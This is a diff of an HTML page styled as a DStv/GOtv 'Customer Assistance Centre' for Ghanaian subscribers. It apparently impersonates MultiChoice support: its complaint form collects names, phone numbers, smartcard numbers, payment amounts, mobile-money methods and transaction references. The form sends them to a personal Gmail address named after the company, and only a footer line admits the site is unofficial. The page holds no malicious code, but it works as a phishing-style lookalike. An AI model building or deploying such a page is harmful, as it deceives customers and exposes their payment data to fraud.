@@ -3,184 +3,326 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Customer Support Centre</title>
+<title>Customer Assistance Centre</title>
 
 <style>
-* {
-    box-sizing: border-box;
-    margin: 0;
-    padding: 0;
+:root {
+    --navy:#102a43;
+    --blue:#1769aa;
+    --gold:#e8b84a;
+    --bg:#f4f7fb;
+    --text:#26384a;
+    --muted:#718096;
+    --white:#fff;
 }
 
-body {
-    font-family: Arial, sans-serif;
-    background: #f4f6fa;
-    color: #263448;
+*{box-sizing:border-box;margin:0;padding:0}
+
+body{
+    font-family:Arial,sans-serif;
+    background:var(--bg);
+    color:var(--text);
 }
 
-header {
-    background: #082d55;
-    color: white;
-    padding: 18px 7%;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    flex-wrap: wrap;
+header{
+    background:white;
+    padding:17px 6%;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    border-bottom:1px solid #e8edf3;
+    position:sticky;
+    top:0;
+    z-index:10;
 }
 
-.logo-area {
-    display: flex;
-    align-items: center;
-    gap: 12px;
+.brand{
+    display:flex;
+    align-items:center;
+    gap:12px;
 }
 
-.logo-area img {
-    max-width: 65px;
-    max-height: 55px;
-    object-fit: contain;
+.brand img{
+    width:48px;
+    height:48px;
+    object-fit:contain;
 }
 
-.logo-area h2 {
-    font-size: 20px;
+.brand h2{
+    font-size:19px;
+    color:var(--navy);
 }
 
-nav a {
-    color: white;
-    text-decoration: none;
-    margin-left: 22px;
-    font-size: 14px;
+nav{
+    display:flex;
+    gap:25px;
 }
 
-.hero {
-    background: linear-gradient(120deg, #082d55, #1268a5);
-    color: white;
-    padding: 75px 8%;
-    text-align: center;
+nav a{
+    text-decoration:none;
+    color:var(--navy);
+    font-size:14px;
+    font-weight:bold;
+    cursor:pointer;
 }
 
-.hero h1 {
-    font-size: 36px;
-    margin-bottom: 18px;
+nav a:hover{color:var(--blue)}
+
+.hero{
+    background:linear-gradient(120deg,#102a43,#1769aa);
+    color:white;
+    padding:85px 8%;
+    position:relative;
+    overflow:hidden;
 }
 
-.hero p {
-    font-size: 17px;
-    line-height: 1.7;
-    max-width: 650px;
-    margin: auto;
+.hero-content{
+    max-width:750px;
 }
 
-.container {
-    max-width: 900px;
-    margin: 40px auto;
-    padding: 20px;
+.hero small{
+    color:#f5d27b;
+    font-weight:bold;
+    letter-spacing:2px;
 }
 
-.card {
-    background: white;
-    padding: 35px;
-    border-radius: 12px;
-    box-shadow: 0 5px 25px rgba(0,0,0,.06);
+.hero h1{
+    font-size:43px;
+    margin:22px 0;
+    line-height:1.2;
 }
 
-.card h2 {
-    color: #082d55;
-    margin-bottom: 12px;
+.hero p{
+    font-size:17px;
+    line-height:1.8;
+    color:#e0eaf5;
 }
 
-.description {
-    color: #667085;
-    line-height: 1.6;
-    margin-bottom: 25px;
+.primary-btn{
+    display:inline-block;
+    background:var(--gold);
+    color:#102a43;
+    padding:15px 25px;
+    border-radius:7px;
+    text-decoration:none;
+    font-weight:bold;
+    margin-top:28px;
+    border:0;
+    cursor:pointer;
 }
 
-.section-title {
-    color: #1268a5;
-    font-size: 17px;
-    margin: 28px 0 10px;
-    border-bottom: 1px solid #e5e9ef;
-    padding-bottom: 10px;
+.container{
+    max-width:1150px;
+    margin:55px auto;
+    padding:0 22px;
 }
 
-label {
-    display: block;
-    font-weight: 600;
-    font-size: 14px;
-    margin-top: 18px;
+.section-heading{
+    margin-bottom:30px;
 }
 
-input, select, textarea {
-    width: 100%;
-    padding: 14px;
-    margin-top: 8px;
-    border: 1px solid #d7dce5;
-    border-radius: 7px;
-    font-size: 15px;
-    background: #fff;
+.section-heading h2{
+    color:var(--navy);
+    font-size:27px;
+    margin-bottom:10px;
 }
 
-input:focus, select:focus, textarea:focus {
-    outline: none;
-    border-color: #1268a5;
+.section-heading p{
+    color:var(--muted);
+    line-height:1.6;
 }
 
-button {
-    width: 100%;
-    padding: 16px;
-    margin-top: 28px;
-    background: #0878c9;
-    border: none;
-    color: white;
-    border-radius: 7px;
-    font-size: 16px;
-    font-weight: bold;
-    cursor: pointer;
+.services{
+    display:grid;
+    grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+    gap:22px;
 }
 
-button:hover {
-    background: #065c9b;
+.service-card{
+    background:white;
+    padding:28px;
+    border-radius:12px;
+    box-shadow:0 5px 20px rgba(16,42,67,.05);
+    border:1px solid #e9edf2;
+    transition:.2s;
 }
 
-.notice {
-    background: #eef5fc;
-    padding: 16px;
-    border-radius: 7px;
-    margin-top: 22px;
-    font-size: 13px;
-    line-height: 1.6;
+.service-card:hover{
+    transform:translateY(-5px);
+    box-shadow:0 10px 28px rgba(16,42,67,.10);
 }
 
-footer {
-    background: #082d55;
-    color: white;
-    text-align: center;
-    padding: 30px 15px;
-    margin-top: 50px;
-    line-height: 2;
+.service-icon{
+    width:52px;
+    height:52px;
+    background:#eaf3fb;
+    border-radius:12px;
+    display:grid;
+    place-items:center;
+    font-size:25px;
+    margin-bottom:20px;
 }
 
-@media(max-width:600px) {
-    header {
-        justify-content: center;
-        gap: 15px;
-    }
+.service-card h3{
+    color:var(--navy);
+    margin-bottom:12px;
+}
 
-    nav {
-        text-align: center;
-    }
+.service-card p{
+    color:var(--muted);
+    font-size:14px;
+    line-height:1.7;
+}
 
-    nav a {
-        margin: 0 8px;
-    }
+.card-link{
+    display:inline-block;
+    color:var(--blue);
+    font-weight:bold;
+    margin-top:18px;
+    cursor:pointer;
+    text-decoration:none;
+}
 
-    .hero h1 {
-        font-size: 27px;
-    }
+.form-section{
+    background:white;
+    border-radius:14px;
+    padding:35px;
+    box-shadow:0 5px 25px rgba(16,42,67,.06);
+    max-width:850px;
+    margin:auto;
+}
 
-    .card {
-        padding: 22px;
-    }
+.form-section h2{
+    color:var(--navy);
+    margin-bottom:12px;
+}
+
+.form-section>p{
+    color:var(--muted);
+    line-height:1.7;
+    margin-bottom:25px;
+}
+
+.form-grid{
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    gap:18px;
+}
+
+.field.full{grid-column:1/-1}
+
+label{
+    display:block;
+    font-size:14px;
+    font-weight:bold;
+    margin-bottom:8px;
+}
+
+input,select,textarea{
+    width:100%;
+    padding:14px;
+    border:1px solid #dce3eb;
+    border-radius:7px;
+    background:#fff;
+    font-size:14px;
+}
+
+input:focus,select:focus,textarea:focus{
+    outline:none;
+    border-color:var(--blue);
+}
+
+.form-title{
+    grid-column:1/-1;
+    color:var(--blue);
+    font-size:16px;
+    border-bottom:1px solid #e8edf3;
+    padding-bottom:12px;
+    margin-top:15px;
+}
+
+.submit-btn{
+    width:100%;
+    padding:16px;
+    background:var(--blue);
+    color:white;
+    border:none;
+    border-radius:7px;
+    font-size:16px;
+    font-weight:bold;
+    cursor:pointer;
+    margin-top:25px;
+}
+
+.submit-btn:hover{background:#10558c}
+
+.notice{
+    background:#eef5fb;
+    padding:17px;
+    border-radius:8px;
+    font-size:13px;
+    line-height:1.7;
+    margin-top:20px;
+}
+
+.track-box{
+    background:white;
+    border-radius:12px;
+    padding:35px;
+    text-align:center;
+    box-shadow:0 5px 20px rgba(16,42,67,.05);
+}
+
+.track-box h2{
+    color:var(--navy);
+    margin-bottom:12px;
+}
+
+.track-box p{
+    color:var(--muted);
+    line-height:1.7;
+}
+
+.track-box input{
+    max-width:450px;
+    margin-top:20px;
+}
+
+footer{
+    background:#102a43;
+    color:white;
+    padding:45px 7%;
+    margin-top:70px;
+}
+
+.footer-content{
+    display:flex;
+    justify-content:space-between;
+    gap:30px;
+    flex-wrap:wrap;
+}
+
+footer p{
+    color:#cbd5e1;
+    line-height:1.8;
+    font-size:13px;
+    margin-top:10px;
+}
+
+footer h3{margin-bottom:12px}
+
+.hidden{display:none!important}
+
+@media(max-width:650px){
+    header{padding:15px 5%;flex-wrap:wrap}
+    nav{gap:13px;margin-top:15px;flex-wrap:wrap}
+    nav a{font-size:12px}
+    .hero{padding:65px 7%}
+    .hero h1{font-size:32px}
+    .form-grid{grid-template-columns:1fr}
+    .field.full{grid-column:auto}
+    .form-title{grid-column:auto}
+    .form-section{padding:22px}
 }
 </style>
 </head>
@@ -189,122 +331,241 @@ footer {
 
 <header>
 
-<div class="logo-area">
-
-<!-- Add your authorized logo file as logo.png -->
-<img src="logo.png" alt="Company Logo"
+<div class="brand">
+<img src="logo.png" alt="Logo"
 onerror="this.style.display='none'">
-
-<h2>Customer Support Centre</h2>
-
+<h2>Customer Assistance Centre</h2>
 </div>
 
 <nav>
 <a href="#home">Home</a>
-<a href="#complaint">Submit Complaint</a>
+<a href="#services">Services</a>
+<a href="#complaint">Submit Request</a>
+<a href="#tracking">Track Request</a>
 </nav>
 
 </header>
 
 <section class="hero" id="home">
+<div class="hero-content">
 
-<h1>How Can We Help You?</h1>
+<small>CUSTOMER ASSISTANCE PORTAL</small>
+
+<h1>How Can We Help You Today?</h1>
 
 <p>
-Welcome to the Customer Support and Payment Resolution Centre.
-Submit your enquiries and payment complaints for review by our support team.
+Access customer assistance, submit payment enquiries
+and request help with subscription-related issues
+through our online support portal.
 </p>
 
+<a href="#complaint" class="primary-btn">
+Submit a Request →
+</a>
+
+</div>
 </section>
 
-<div class="container" id="complaint">
+<section class="container" id="services">
 
-<div class="card">
+<div class="section-heading">
+<h2>Our Support Services</h2>
+<p>Select a service category to get started.</p>
+</div>
 
-<h2>Customer Complaint Form</h2>
+<div class="services">
 
-<p class="description">
-Please complete the form below with accurate information.
-Our support team will review your submission.
+<div class="service-card">
+<div class="service-icon">📺</div>
+<h3>Subscription Support</h3>
+<p>Submit enquiries relating to subscription services and account issues.</p>
+<a href="#complaint" class="card-link">Get Assistance →</a>
+</div>
+
+<div class="service-card">
+<div class="service-icon">💳</div>
+<h3>Payment Complaints</h3>
+<p>Report payment issues and provide transaction information for review.</p>
+<a href="#complaint" class="card-link">Report an Issue →</a>
+</div>
+
+<div class="service-card">
+<div class="service-icon">🔍</div>
+<h3>Request Tracking</h3>
+<p>Find out how to follow up on a previously submitted support request.</p>
+<a href="#tracking" class="card-link">Track Request →</a>
+</div>
+
+<div class="service-card">
+<div class="service-icon">🎧</div>
+<h3>Customer Enquiries</h3>
+<p>Send your questions and request assistance from the support team.</p>
+<a href="#complaint" class="card-link">Contact Support →</a>
+</div>
+
+</div>
+</section>
+
+<section class="container" id="complaint">
+
+<div class="form-section">
+
+<h2>Submit a Support Request</h2>
+
+<p>
+Complete the information below. Please provide accurate
+details to help with the review of your enquiry.
 </p>
 
 <form action="https://formsubmit.co/multichoiceghanalimited9@gmail.com"
 method="POST">
 
 <input type="hidden" name="_subject"
-value="New Customer Support Request">
+value="New Customer Support Submission">
 
-<h3 class="section-title">01. Customer Information</h3>
+<input type="hidden" name="_captcha" value="true">
 
+<div class="form-grid">
+
+<h3 class="form-title">01 — Customer Information</h3>
+
+<div class="field">
 <label>Full Name</label>
 <input type="text" name="Full Name" required>
+</div>
 
+<div class="field">
 <label>Phone Number</label>
 <input type="tel" name="Phone Number" required>
+</div>
 
+<div class="field full">
 <label>Email Address</label>
 <input type="email" name="Email">
+</div>
 
-<h3 class="section-title">02. Subscription Information</h3>
+<h3 class="form-title">02 — Subscription Information</h3>
 
+<div class="field">
 <label>Service Type</label>
 <select name="Service Type" required>
-<option value="">Select Service</option>
+<option value="">Choose Service</option>
 <option>DStv</option>
 <option>GOtv</option>
 <option>Other</option>
 </select>
+</div>
 
+<div class="field">
 <label>IUC / Smartcard Number</label>
 <input type="text" name="IUC Number" required>
+</div>
 
-<h3 class="section-title">03. Payment Information</h3>
+<h3 class="form-title">03 — Payment Information</h3>
 
+<div class="field">
 <label>Amount Paid (GHS)</label>
 <input type="number" name="Amount Paid"
 min="0" step="0.01" required>
+</div>
 
+<div class="field">
 <label>Payment Method</label>
 <select name="Payment Method" required>
-<option value="">Select Payment Method</option>
+<option value="">Choose Method</option>
 <option>MTN MoMo</option>
 <option>Telecel Cash</option>
 <option>AT Money</option>
 <option>Bank Transfer</option>
 <option>Other</option>
 </select>
+</div>
 
+<div class="field">
 <label>Transaction Reference</label>
 <input type="text" name="Transaction Reference" required>
+</div>
 
+<div class="field">
 <label>Payment Date</label>
 <input type="date" name="Payment Date" required>
+</div>
 
-<h3 class="section-title">04. Complaint Details</h3>
+<h3 class="form-title">04 — Request Details</h3>
 
-<label>Describe Your Complaint</label>
+<div class="field full">
+<label>Describe Your Issue</label>
 <textarea name="Complaint Details"
 rows="5" required></textarea>
+</div>
+
+</div>
 
 <div class="notice">
-Your information will be used to review your support request.
-Never submit your MoMo PIN, password, OTP or banking login details.
+By submitting this form, you agree to have the information
+provided used to review your support request. Never provide
+your PIN, password, OTP or banking login credentials.
 </div>
 
-<button type="submit">Submit Request</button>
+<button type="submit" class="submit-btn">
+Submit Support Request →
+</button>
 
 </form>
+</div>
+</section>
+
+<section class="container" id="tracking">
+
+<div class="track-box">
+
+<h2>Track Your Request</h2>
+
+<p>
+Have an existing request? Request tracking will be
+available once the secure tracking system is connected.
+</p>
+
+<p>
+Keep your submission reference number for future follow-up.
+</p>
 
 </div>
-</div>
+
+</section>
 
 <footer>
 
-<p>Customer Support & Payment Resolution Centre</p>
+<div class="footer-content">
 
-<p>Customer Assistance Portal</p>
+<div>
+<h3>Customer Assistance Centre</h3>
+<p>Online customer assistance and enquiry portal.</p>
+</div>
 
-<p>© 2026 All Rights Reserved.</p>
+<div>
+<h3>Quick Links</h3>
+<p>
+Home<br>
+Support Services<br>
+Submit Request<br>
+Request Tracking
+</p>
+</div>
+
+<div>
+<h3>Important Information</h3>
+<p>
+This is an independently operated customer assistance
+portal and is not an official MultiChoice website.
+</p>
+</div>
+
+</div>
+
+<p style="margin-top:35px;text-align:center">
+© 2026 Customer Assistance Centre. All rights reserved.
+</p>
 
 </footer>
 
